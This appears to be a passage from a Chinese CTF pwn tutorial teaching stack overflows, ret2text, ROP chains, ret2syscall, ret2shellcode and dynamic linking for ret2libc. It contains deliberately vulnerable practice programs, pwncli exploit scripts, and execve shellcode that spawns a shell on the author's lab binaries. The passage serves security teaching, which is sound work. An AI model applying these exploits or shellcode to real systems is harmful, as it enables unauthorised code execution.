---
Author: eastXueLian
---
---

> [!INFO]
> 经过前面的学习，读者现在应该已经初步掌握以下内容：
> 
> - pwntools/pwncli 的基本使用
> - gdb + pwndbg 的调试方法
> - libc（动态链接库）的概念
> - 函数调用约定
> - 常见汇编语句
> - 栈结构
> 
> 接下来的第一章将会带领读者运用上面的知识正式开启 pwn 的旅程。
# 1.0 ROP 介绍

> ROP，即 return oriented programming（返回导向编程），关键在于劫持程序控制流后，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。
## 1.0.0 控制流劫持

> [!NOTE]
> 在二进制安全中，大部分的漏洞利用方式是劫持控制流，接着使程序按照攻击者的攻击思路运行下去。控制流劫持是一种危害性极大的攻击方式，攻击者能够通过它来获取目标机器的控制权，甚至进行提权操作，对目标机器进行全面控制。当攻击者掌握了被攻击程序的内存错误漏洞后，一般会考虑发起控制流劫持攻击。

控制流的劫持意味着攻击者劫持了 PC（program counter）寄存器，从存在漏洞的程序到控制流劫持也是 pwn 的重点，实现这一目标的方法有很多，但总是离不开跳转（包括函数返回、函数指针的调用等）。
### 例题 chp1-0-hellopwner

先来看一个简单的例子，这也是本章真正意义上的第一道 pwn 题（见附件文件夹-chp1-0-hellopwner）：

> [!NOTE]
> 读者可以尝试先不看源码，把 elf 文件拖到 ida64 中试试能不能自己找到漏洞所在。
> 
> 这里给一点提示：这个程序中有不只一处漏洞，读者可以关注：`对读入的字符串处理不当导致的缓冲区溢出` 以及 `对整数处理不当导致的负数溢出`。

回到这个例子中，由于编译时采用了 `-static -no-pie` 的选项，因此地址都是固定的，这无疑给我们的利用带来了很大的便利：利用漏洞劫持控制流时，可以直接来到目标函数处，而不需要额外的手段去泄露程序地址和 libc 地址。

而主要漏洞出现在 `get_a_num` 函数中：

```c
__int64 get_a_num()
{
  gets(input);
  return atoi(input);
}
```

这里需要注意的一点是，gets 函数往往是造成缓冲区溢出的罪魁祸首，它在遇到字符串中的 `\x00` 等字符时并不会停下，而会一直向缓冲区中读入数据直到换行符的出现。

以及 run 函数中：

```c
// ...
int cmd;
// ...
cmd = get_a_num();
// ...
return ((__int64 (__fastcall *)(__int64, _QWORD, _QWORD))cmdtb[cmd])(buf_0, v17, v15);
```

也就是说这里 cmd 是一个 int 类型，可以为负数，这就导致了调用函数指针 `cmdtb[cmd]()` 时能调用它前面的缓冲区上，来到 .bss 段上发现 cmdtb 前面正是上面 gets 的缓冲区：

```nasm
.bss:00000000004C4300                 public input
.bss:00000000004C4300 ; u32 input[64]
.bss:00000000004C4300 input           dd 40h dup(?)           ; DATA XREF: get_a_num+8↑o
.bss:00000000004C4300                                         ; get_a_num+19↑o
.bss:00000000004C4400                 public cmdtb
.bss:00000000004C4400 ; __int64 cmdtb[]
.bss:00000000004C4400 cmdtb           dq ?
```

于是很自然地可以想到，用 `get_a_num` 控制输入，用 cmdtb 对函数指针的调用去劫持程序控制流。

回到函数列表中，发现本道例题设计时提供了一个名为 flag1 的函数但是并没有被调用，那我们只需要按照上述思路劫持控制流到 flag1 的地址即可，`exp_flag1.py` 如下：

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc
i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")
def cmd(data):
    ru(b'cmd> ')
    sl(data)
def call_func(data, idx, key=b""):
    cmd(data)
    ru(b'offset: ')
    sl(i2b(idx))
    if data[:2] == b"1\x00":
        ru(b'data: ')
        sl(key)

call_func(b"-31\x00".ljust(8, b"\x00") + p64(elf.symbols["flag1"]), 0)
ia()
```

读者也可以跟着 gdb 调试一下，把断点设置在 `0x401f36 <run+189>    call   r8` 的地方，就可以看到程序的 rip 寄存器确实被劫持到了 flag1 函数的地方继续执行。

> [!QUESTION]
🤔 **思考题：当然这不是这道题的全部，读者也可以考虑：我们能否利用其它办法，完全获取这个程序的控制权，让它运行我们的恶意代码（shellcode）呢？**

---
## 1.0.1 ret2text

> 经过上面的例子，读者已经初步了解了程序的执行流程是怎么回事，接下来回到本章主题 ROP 上。

rop 中的 R 代表 return，即函数返回时调用的汇编语句 ret，读者不妨结合 [[准备工作]] 中对函数调用机制的介绍来进行思考：

- 既然函数返回地址是存放在栈上的，若攻击者通过程序漏洞在函数里面修改了该函数的返回地址会发生什么？

下面给出例题，读者不妨构造不同的输入，结合调试进行思考：
### 例题 chp1-1-ret2text

例题代码很简单，这里给出源码：

```c
// compiled with: gcc -no-pie -fno-stack-protector ./ret2text.c -o ./ret2text
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void gift() {
    asm("pop %rax");
    system("/bin/sh");
}
int main() {
    char buf[0x20];
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

值得注意的是，这里编译时选项 `-no-pie` 关闭了地址随机化的保护，`-fno-stack-protector` 选项关闭了栈上 canary 的保护，这免除了我们泄露地址和 canary 的麻烦。

main 函数中是存在栈溢出漏洞的：栈上缓冲区 buf 长度为 0x20，而接下来用 read 函数读入了 0x100 个字节的内容，可以使用 gdb 进行调试，随便敲几个 a 进去，得到程序读取输入后栈布局如下：

```nasm
pwndbg> stack
00:0000│ rsi rsp 0x7ffd7906b370 ◂— 'aaaaaaaaaa\n'
01:0008│         0x7ffd7906b378 ◂— 0xa6161 /* 'aa\n' */
02:0010│         0x7ffd7906b380 —▸ 0x7ffd7906b480 ◂— 0x1
03:0018│         0x7ffd7906b388 ◂— 0x0
04:0020│ rbp     0x7ffd7906b390 ◂— 0x0
05:0028│         0x7ffd7906b398 —▸ 0x7fe443e13083 (__libc_start_main+243) ◂— mov    edi, eax
06:0030│         0x7ffd7906b3a0 —▸ 0x7fe44402e620 (_rtld_global_ro) ◂— 0x50f5500000000

```

上面 rsi 和栈顶指针 rsp 都指向 buf 的起始地址，栈底指针 rbp 指向 rsp+0x20 的位置，而 rbp 再下面一个位置明显指向一段代码，这就是返回地址了。

> [!INFO]
> 函数中局部变量大小为 0x20 个字节，而返回地址却在 rsp+0x28 的位置，那 rsp+0x20 的位置，即 rbp 现在所指的位置上放着什么？
> 
> 事实上，这个位置是存放上个函数 rbp 的，这在章节 0.4 中已经有所介绍，对此感到疑惑的同学可以参考前面的内容来理解栈帧的结构。
> 
> 由于 main 函数此时是程序中调用的第一个有完整栈帧结构的函数，因此 rbp 所指内存地址上的值是 0。

本例中我们使用一些字符来占位，最终实现修改函数返回地址的目标，exp.py 如下：

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

ru(b'Give me your data: \n')
# payload = b"a"*(YOUR_OVERFLOW_LENGTH)
# payload += p64(elf.symbols['WHICH_FUNCTION?'])
s(payload)

ia()
```

可以进行调试，发现 read 过后栈上布局如下：

```bash
pwndbg> stack
00:0000│ rsi rsp 0x7ffd5ad25db0 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓            4 skipped
05:0028│         0x7ffd5ad25dd8 —▸ 0x401176 (gift) ◂— endbr64
06:0030│         0x7ffd5ad25de0 —▸ 0x7f74b9060620 (_rtld_global_ro) ◂— 0x50f5500000000
```

可以看到返回地址已经成功被覆盖为 gift 函数的地址，继续运行即可劫持程序执行流程到 gift 函数中，最终 `getshell`。

上面我们劫持控制流，使程序返回到代码段已有函数的技巧也被称作 `ret2text`。

---
# 1.1 ROP 链

在上一节的的例子中，gift 函数中有这样一句内联汇编 `asm("pop %rax")`，这里我们把它去掉试试：
### 例题 chp1-1-ret2text-revenge

这里给出源码如下：

```c
// compiled with: gcc -no-pie -fno-stack-protector ./ret2text-rev.c -o ./ret2text-rev
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void gift() {
    system("/bin/sh");
}
int main() {
    char buf[0x20];
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

> [!TIP]
> 因为程序 io 交互等都没有改，直接运行之前的 exp 同样是可以通过栈溢出劫持 rip 到 gift 函数中的，但是实际运行后发现并没有成功 getshell，读者不妨自己调试一下找找原因。

运行之前的 exp 并来到 gdb 中进行调试，可以发现程序确实是来到了 gift 函数中，但是继续运行时卡在了这一句上面：

```c
0x7f47d8a06e3c <do_system+364>    movaps xmmword ptr [rsp + 0x50], xmm0
```

实际上这句汇编语句是用于检查栈是否对齐的，即 rsp+0x50 是否 0x10 对齐，可以看到当前 rsp 十六进制下末位是 8，即栈没对齐：

```bash
00:0000│ rsp   0x7ffdee8dd548 —▸ 0x7f47d8ac2fd2 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
01:0008│ rdi-4 0x7ffdee8dd550 ◂— 0xffffffff
02:0010│       0x7ffdee8dd558 —▸ 0x7ffdee8dd8c0 —▸ 0x4011d0 (__libc_csu_init) ◂— endbr64
03:0018│       0x7ffdee8dd560 —▸ 0x402004 ◂— 0x68732f6e69622f /* '/bin/sh' */
04:0020│       0x7ffdee8dd568 ◂— 0x14
05:0028│       0x7ffdee8dd570 ◂— 0x7c /* '|' */
06:0030│       0x7ffdee8dd578 ◂— 0x0
07:0038│       0x7ffdee8dd580 —▸ 0x7f47d8bf59e8 (_rtld_global+2440)
```

故无法通过这句检查，程序报错退出，这时读者不难猜到，gift 函数中额外加的那句内联汇编是用来调整使栈对齐的。

但是作为攻击者，难道这是候就束手无措了吗？答案当然是否定的，这时候就要引出 ROP 链（rop chain）的思路了：

本章开始介绍 rop 时曾提到过 gadgets 的概念，即借助程序中现有的小片段来实现程序执行流程的控制，至于这些 gadgets 的获取，有几种思路：

- gadgets 的目标是控制寄存器值或者调整栈结构
    - 即 gadgets 会包含 pop 等语句来控制寄存器值
- gadgets 不能破坏我们 rop 链的执行流程
    - 即 gadgets 会以 ret 等语句来进行结尾

因此可以根据这些目标直接在 gdb / ida 中进行人工筛选。

当然这些繁琐的工作可以交给现有工具来进行：ropper 和 ROPgadget 都是很好的辅助工具，其中 ropper 适合对大型文件进行查找，而命令行下的 ROPgadget 则便于结合管道符和 shell 命令使用。

回到例题中，我们的目标是使栈对齐，故可以直接在栈上先放一个 `ret;` 语句，随后再跟上 gift 函数的地址：

第一步先找一个 ret 语句：

```bash
❯ ROPgadget --binary ./ret2text-rev --only "pop|ret" | grep ret
0x000000000040122c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040122e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401230 : pop r14 ; pop r15 ; ret
0x0000000000401232 : pop r15 ; ret
0x000000000040122b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040122f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040115d : pop rbp ; ret
0x0000000000401233 : pop rdi ; ret
0x0000000000401231 : pop rsi ; pop r15 ; ret
0x000000000040122d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
```

这里最后一个 `0x000000000040101a` 就符和要求，接下来把这句接到原本的 payload 上，构成 ROP 链：

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

ret_addr = 目标 gadget 的地址

ru(b'Give me your data: \n')
payload = b"a"*(溢出长度？)
payload += p64(ret_addr)
payload += p64(elf.symbols['gift'])
s(payload)

ia()
```

这是后运行到 main 函数退出时栈上情况如下：

```bash
pwndbg> stack
00:0000│ rsp 0x7ffd180320a8 —▸ 0x40101a (_init+26) ◂— ret
01:0008│     0x7ffd180320b0 —▸ 0x401176 (gift) ◂— endbr64
```

即先到 `ret` 语句上，使栈实现对齐再 ret 到 gift 函数上，最终成功实现 getshell。

---
## 1.1.1 ret2syscall

当然，rop 并不一定需要程序中存在现有的利用代码，接下来介绍 ret2syscall 的利用方法：

正如在章节 0.4 中介绍的那样，汇编语言提供了另一种不借助库函数而是直接利用中断来调用函数的方法，在 [amd64 架构下中断](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)就是 syscall，而中断号存放在 rax 中，具体可以查阅对应架构的中断向量表，下面以常见的几个 syscall 为例：

```bash
%rax	System call	%rdi	%rsi	%rdx	%r10	%r8	%r9
0	sys_read	unsigned int fd	char *buf	size_t count
1	sys_write	unsigned int fd	const char *buf	size_t count
2	sys_open	const char *filename	int flags	int mode
9	sys_mmap	unsigned long addr	unsigned long len	unsigned long prot	unsigned long flags	unsigned long fd	unsigned long off
10	sys_mprotect	unsigned long start	size_t len	unsigned long prot
40	sys_sendfile	int out_fd	int in_fd	off_t *offset	size_t count
59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]
```

如我们想调用 `sys_execve` 来实现 getshell 时，就需要使 rdi 为指向字符串 `b"/bin/sh\x00"` 的指针，rsi 和 rdx 为 0 即可，最后使 rax 为 59，最后执行 syscall 就能获得 shell.
### 例题 chp1-1-ret2text-revenge-revenge

这时候在上面的例题中去掉了 gift 函数并且采用静态编译，源码如下：

```c
// compiled with: gcc -static -no-pie -fno-stack-protector ./ret2text-rev-rev.c -o ./ret2text-rev-rev
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    char buf[0x20];
    puts("/bin/sh");
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

这时候再用 ROPgadget 来搜索 gadgets 就能发现查找速度慢了很多，这是因为静态编译使得程序中 gadgets 数量更多了，这对于 ROP 利用来说是好事，因为我们可以找到更多的有用 gadgets 了。

来看一下现有条件：

- 静态编译的程序，给我们带来了很多 gadgets（如 `syscall ; ret`）
- 溢出长度多达 0x100-0x20，这意味着我们可以布置很长的 rop 链
- 没有地址随机化，所以 gadgets 的地址都是固定的，用工具找到后直接拿来用就行

于是根据上面的思路构造出如下 rop 链：

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

syscall_ret = 0x0000000000416c44
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x000000000040f15e
pop_rdx_ret = 0x000000000040176f
pop_rax_ret = 0x0000000000414df4
str_bin_sh  = next(elf.search(b"/bin/sh\x00"))

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(pop_rdi_ret) + p64(str_bin_sh)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall_ret)
s(payload)

ia()
```

读者不妨试试自己构造上面的 rop 链，下面留给读者一个问题和一个挑战：

> [!QUESTION]
> **思考题：实际上源程序中本来是没有字符串 "/bin/sh\x00" 的，这个字符串可以放在栈里吗？如果放在栈里那需要对 exp 做出什么样的改变？简单描述思路即可。**

---
### 挑战：例题 chp1-1-ret2text-revenge-revenge-revenge

上面利用 `execve("/bin/sh", 0, 0)` 的方式实现了 getshell，那如果题目中通过 seccomp 来禁用了 evecve 的系统调用呢？我们是否还有办法获取 flag？

```c
// compiled with: gcc -static -no-pie -fno-stack-protector ./ret2text-rev-rev-rev.c -o ./ret2text-rev-rev-rev -lseccomp
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <seccomp.h>
#include <linux/seccomp.h>

int main() {
    char buf[0x20];
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
    seccomp_load(ctx);
    puts("/bin/sh");
    puts("flag is at: ");
    puts("/flag");
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

答案当然是肯定的，这里给读者一个小提示：orw 或者 open + sendfile。

---
# 1.2 ret2shellcode

> [!INFO]
> shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。
> 
> ret2shellcode 就是先在内存中布置好 shellcode，然后再跳转过去执行实现利用。
> 
> 相比于之前提到的 ROP gadgets，shellcode 给攻击者提供了更大的自由度，相当于完全控制了目标机器，便于后面的反弹 shell、提权、虚拟机穿透等进阶利用。
## 1.2.0 shellcode 的生成

之前我们学习了汇编语法和简单的程序编写，但是我们还没学习如何编译运行。主流的环境有gas、nasm工具链，但是这里我们采用一些比较特殊的方式来运行。
## 1.2.1 编译运行脚本

建立我们的汇编指令文件`test.asm`

```nasm
push rbp
mov rbp,rsp
mov rax,1
push 0xa636261
mov rdi,1
mov rsi,rsp
mov rdx,4
syscall
leave
ret
```

调用`write(stdout,"abc\n",4)`在屏幕上打印一行abc

编写汇编脚本`asm.py`，将之转化为机器码

```python
from pwn import *
context.arch='amd64'
a=open('test.asm').read()
s=asm(a)
print(s)
open('test.bin','wb').write(s)
```

编写简易执行器`run.c`

```c
#include <stdio.h>
#include <string.h>
int main(){
    char a[300],*p=a,c;
    while(~(c=getchar())) *(p++)=c;
    ((void(*)())a)();
}
```

编译时记得加参数

```bash
gcc run.c -o run -z execstack
```

最后运行

```bash
python3 asm.py
./run < test.bin
```

结果和我们预期一样

```bash
$ ./run.out < test.org
abc
```
## 1.2.2 执行器的原理

看看我们最简单的代码执行器，前面是输入，最后一行其实是将输入的字符数组a强制转化为void型无参数的函数指针并调用。事实上，函数在内存中用函数代码段首地址来标识，换言之所谓函数指针也就是一个指向机器码地址，所以完全可以用一个字符指针来充当。要想正常运行，需要这个字符指针指向的数组内容每一比特正好是对应函数的机器码（表现起来是一堆乱码而非ASCII可打印字符）。

我们来看看这个程序的关键部分：

```c
((void(*)())a)();
```

编译为

```nasm
    11c6:       48 8d 95 c0 fe ff ff    lea    rdx,[rbp-0x140]
    11cd:       b8 00 00 00 00          mov    eax,0x0
    11d2:       ff d2                   call   rdx
```

第一行，将a的地址算好赋给rdx；第二行无关紧要；第三行直接callrdx，相当于把字符串a里的字节当成一串指令去运行。这就是强制转换成函数指针的原理。这是最简单的形式，因为函数有类型、有参数，不同形式的函数指针区别就在于编译时生成的传参数、返回值的指令片段不同，具体细节和编译原理有关，此处不深入。
## 1.2.3 思考和启发

事实上这里我们执行了最简单的shellcode。虽然没有破坏性，但如果我们执行`execve("/bin/sh",0,0)`,具体为如下代码段(run的stdin没切换，看不到效果，需要特殊处理)：

```nasm
push rbp
mov rbp,rsp
mov rax,59
push 0x6873
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall
leave
ret
```

之前说过，二进制数据大体分数据、地址、指令这几类，这里事实上就是没有处理好**数据**和**指令**的隔离性，导致两者混淆了，产生了安全问题。
## 1.2.4 实际运用的思考

假设如下一个情况：服务器开放了一个端口，服务器上一个含有漏洞的程序监听这个端口，这个程序可以输入任意一串字符串，并且这串字符串所在的段有执行权限。那么我们需要做的就是将程序的控制流劫持到这个字符串，具体来说，就是用各种手段将`rip`寄存器的值修改成这串字符串的首地址。这样，我们在字符串中构造好shellcode后程序就会执行我们需要运行的代码。

我们由浅入深思考一下需要解决的几个问题：

- 这串shellcode怎么构造？
    
    shellcode的构造方式有很多种，首先当然是顾名思义执行shell。
    
    因此我们之前写到的`execve('/bin/sh',NULL,NULL)`是一种选择，这里相当于执行`/bin/sh`程序，没有参数也没有其他环境变量。在amd64下，用syscall调用，调用号为59，只要将`rdi`指向`/bin/sh`字符串，`rsi`、`rdx`置0即可。后两个变量是二级字符指针，构造起来略微麻烦。
    
    同时，程序可能通过一些类似于`seccomp`的手段，禁止掉59号等比较危险的调用。我们无法直接写内核代码，因此我们需要一些其他的系统调用。这里比较常用的是`orw(open,read,write)`。
    
    `open`调用的功能是打开文件，创建`fd`文件描述符。`fd`我们在之前提到过，0、1、2这三个是系统保留的`stdin`、`stdout`、`stderr`，如果我们打开了其他文件，系统就会创建新的fd，序号从3开始计数。
    
    因此我们按顺序执行三个`syscall`
    
    `1.open("/path/to/flag",0)`
    
    `2.read(3,buf,len)`
    
    `3.write(1,buf,len)`
    
    第一个`syscall`的作用是打开`flag`文件，创建新的`fd`。一般情况下，`flag`文件和可执行程序在同一目录下，所以第一项一般直接用`flag`字符串就行。
    
    第二个`syscall`的作用相当于从fd里读取len长度的字节，到buf中去，相当于fscanf。如果程序是第一次打开文件，那么fd写入3就行。但是更精确地来说，open系统调用的返回值是打开的新fd，在函数返回后存在rax中，因此我们可以在第一次调用后将rax的值拿过来用。
    
    第三个`syscall`的作用相当于把buf开始len长度的字节写入到fd中去，如果fd等于1就打印到屏幕上。
    
    一般来说，buf的选取需要一段可以读写的数据段，我们常常选择bss段上的空闲空间。
    
- 用什么方式劫持`rip`？
    
    首先，最简单的方式当然是题目里面直接将字符串强制转换为函数指针并调用。一般这种情况多见于入门题，或者题目的考点本身不在这里（比如在shellcode上做文章）。
    
    其他情况下，我们需要用各种方式来劫持控制流，这本身是pwn里比较核心的一部分，这里介绍一种最简单的：栈溢出。
    
    我们知道，如果程序通过函数调用main或者其他函数执行，将会通过call指令进入函数，最后通过ret指令退出。call指令在栈上保存函数结束以后的返回地址，ret时读取这个地址并从那里开始执行。如果在函数中，我们可以在栈上写入一串长度超出限制的字符串，并且精确覆盖call指令存入的返回地址，将之修改成我们希望返回的地址，就可以实现控制流的劫持，这就是一种最简单的栈溢出。
    
- shellcode的内容是否有限制？
    
    这是shellcode题目的另一种考点。
    
    非常实际的问题：如果我们通过`gets(buf)`来输入，那么shellcode中就不能出现`'\n'`即`0x0a`，如果是`scanf("%s",buf)`则不能包含各种诸如空格、换行、`'\t'`等分隔符。如果是通过`read(1,buf,len)`，那么输入的shellcode长度不能超过len字节。
    
    更有甚者，出题者会自建函数来审核输入的字符串，比如必须要是ascii可打印字符、必须是字母数字、必须全是偶数字节等等各种奇怪的要求，这也是这类专门关注shellcode本身构造的pwn题的难度所在。
    
    幸好，各种常见的限制条件在网上都有了生成脚本，也有较为专门的套路去构造。
## 1.2.5 实践操作

### 例题 chp1-0-hellopwner-flag2

还记得我们在章节 1.0 中看到的例题 chp1-0-hellopwner 吗，我们使用了 ret2text 的方法拿到了 flag1，但是还没有成功实现 getshell，接下来考虑采用 ret2shellcode 的方法来拿到 shell：

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')
context.arch = "amd64"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(data):
    ru(b'cmd> ')
    sl(data)
def call_func(data, idx=0, key=b""):
    cmd(data)
    ru(b'offset: ')
    sl(i2b(idx))
    if data[:1] == b"1":
        ru(b'data: ')
        sl(key)

buf_addr = 0x4c5000 + 8
gets_addr = elf.symbols['gets']
mprotect_addr = elf.symbols['mprotect']
bytes_binsh = u64_ex(b"/bin/sh\x00")
call_func(怎么溢出才能调用到自定义的几个函数？提示如下：)
# -1 => shellcode
#  0 => gets
#  1 => mprotect

shellcode = b"a"*8
shellcode += asm(f"""
    // execve(b"/bin/sh\x00", 0, 0);
    mov rax, {bytes_binsh};
    push rax;
    mov rdi, rsp;
    xor rsi, rsi;
    xor rdx, rdx;
    push SYS_execve;
    pop rax;
    syscall;
""")
sl(shellcode)
call_func(i2b(1), 0x1000, 这里在调用 mprotect，长度必须对齐到页，并且要执行权限，这里该输入什么？)
call_func(i2b(-1)) # 调用刚刚传入的 shellcode

ia()
```

---
# 1.3 ret2libc

> [!INFO]
> 之前，我们在ROP题中提到静态链接。静态自然对应动态，两者分别是什么东西呢？
> 
> 我们程序的不同函数之间相互调用，可能通过绝对或者相对地址来定位。比如说，写在同一个源代码文件里的两个C函数，一般相互调用时，比如a函数里call了b函数，最初编译可能就在程序里留一个call b，这里的b只是一个标号，因为可能还不知道b在哪儿。直到其他编译过程都处理完，整个程序的结构、各个函数的长度、位置和相对偏移位置都固定了，最后再在刚才留着函数标号的地方回填函数的地址或者相对偏移。事实上，这就是一种程序的链接过程，也是我们在C语言中学到的程序编译的“预处理-编译-链接”里的最后一步。

同样地，如果程序有多个源文件，那么最后也要经过多个编译好的目标文件之间的地址链接来将程序结合起来，使得他们之间可以相互知道各自的位置，用以相互调用。

而我们在学习C语言的时候，永远绕不开的是库函数调用。著名的`printf`系列函数更是初学者绕不开的重点。在调用这些函数的时候，我们有以下两种倾向：

- 真的将printf从stdio.h里取出来在我们的程序里编译一次，或者把编译好的指令拿过来，作为我们自己程序的一部分，随着程序一起发布。
- 既然这个函数这么常用，那么不如事先编译好，在每台电脑里跟随系统都装一份，在我们的代码要运行时从系统里调用出来，这样我们的程序只需要保留自己编写的部分，而不用附带系统函数的实现。

这两种方法分别就是静态链接和动态链接。前者在编译时做好了链接，运行时省去了链接等计算，效率可能更高，但会导致程序容量偏大；后者编译时不用链接库函数，程序量大大精简，但在运行时进行链接可能略微降低效率。我们的ROP大多数执行在静态链接的程序中，原因就是静态链接取出的库函数编译版本里含有大量指令，在不开启PIE时可以直接取用，含有完整gadget的概率很大。一旦程序采用动态链接，那么程序量会非常精简，有时甚至连syscall都找不到，直接执行ROP的难度比较高。

而在我们常用的linux中跟随系统发布的库函数动态链接文件(一般为.so后缀)，就是后面学pwn需要详细了解的glibc。

## 1.3.0 glibc入门

glibc，全称GNU C library。我们在ubuntu程序中用gcc不加任何参数编译的程序大多数就是动态链接到系统的glibc来调用库函数的。在IDApro中左边栏中一大串粉色的函数名表说明存在动态链接。

glibc中含有很多的函数实现代码，在程序中我们只需要call相应的函数真实地址就能完成调用。但是，动态链接常常伴随一个很常用的保护手段，那就是我们永远绕不过的ASLR（Address space layout randomization，地址空间布局随机化）。简单来说，这是个类似于附加在libc上的PIE：整个libc的数据和代码段都会加上一个基地址，这个基地址往往附带一个随机的偏移量，每次运行时都不同。例如，本次运行时程序的libc基地址为0x7ffff7dc3000，gets函数在libc中的地址为0x86af0，那么gets函数在本次运行中的真实地址就是两者相加得到的0x7ffff7e49af0。和PIE不同的是，ASLR是一个系统功能，而PIE是程序自身的选项。

同时，glibc也有一些特殊性质。由于glibc是跟随系统发布的，同一版本的glibc在两台设备上应该是完全相同的。所以，里面各个函数、符号之间的相对偏移位置是固定的。比如，printf的地址在0x64e10，gets在0x86af0，那么不管基地址是多少，gets的实际位置都应该在printf的+(0x86af0-0x64e10)处；事实上背后原理更简单，只要我们确定了一个函数的实际位置，那么就能结合同版本glibc的本地文件确定本次程序的glibc的基地址，从而确定所有glibc中所有函数和符号的实际位置。

第二点，在64位程序下，段地址分配是以0x1000为一页作为单位的，因此基地址16进制的后三位总为0，导致同一个函数实际地址16进制的后三位不管如何随机化，总是相同的。然而大量的库函数通过自动化的脚本编译链接而成，glibc版本迭代时的代码修改导致不同版本的不同函数的相对偏移差别很大。举例来说，我们多次运行某程序，得到其gets的后三位总为0xaf0，printf的后三位总为0xe10，或者还有其他函数的信息，用这些信息我们就可以通过一些数据库筛选出一些版本的glibc，最终确定本程序运行时使用的版本。
## 1.3.1 动态链接的实现

之前讲过静态链接和动态链接的概念，这里讲一下动态链接的实现。

首先需要普及两个段的概念：PLT、GOT。这两个段都在我们自己编译的可执行程序里。

PLT（程序连接表，Procedure Link Table）是个代码段，里面为每个可执行程序的库函数写了一小段代码，代码内容是跳转到库函数的真实地址。程序在编译时，会讲我们代码中调用到的所有库函数统计一次，制作一张PLT表。

GOT（全局偏移表，Global Offset Table）是个数据段，可以看成一个存了许多函数指针的数组，这些函数指针对应了程序里调用的每个库函数在glibc里的真实地址。GOT表中的每一项对应PLT表中的每一项。

那么这两个段在动态链接中有什么作用呢？

事实上，我们的程序编译完的时候并不知道库函数的真实地址，所以程序中的代码在调用库函数的时候，调用的是其plt表地址。例如，我们在动态链接的程序中调用gets，那么编译完的程序中的代码其实是：

```nasm
call gets@PLT
```

PLT则是一个代码段，通过查找GOT数组表里的值来最终跳转到库函数的真实地址。下面是不太严格的伪代码。

```nasm
